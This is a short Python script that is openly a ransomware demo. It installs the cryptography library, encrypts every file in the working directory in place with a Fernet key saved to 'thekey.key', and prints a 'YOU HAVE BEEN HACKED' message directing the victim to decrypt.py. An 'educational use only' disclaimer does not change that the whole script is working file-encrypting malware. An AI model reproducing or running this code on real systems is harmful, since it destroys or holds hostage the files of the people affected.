import os
import subprocess
import time
subprocess.run(["python", "-m", "pip", "install", "cryptography"])
from cryptography.fernet import Fernet
#Disclaimer: For educational use  only
files = []
for file in os.listdir():
	if file == "encrypt.py" or file== "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)
key=Fernet.generate_key()
with open("thekey.key","wb") as thekey:
	thekey.write(key)
for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)
print("YOU HAVE BEEN HACKED!!! \n")
print("Hello dear user, this file is a ransomware and has encrypted your files in a 128 bit AES encryption, if you have been subjected to an attack via this file, please be aware this has been done by a script kiddy.if you wish to decrypt your files safely, please run decrypt.py")
print(" \n This was made for educational purposes only by WhiteHatCyberus ") 
time.sleep(4)
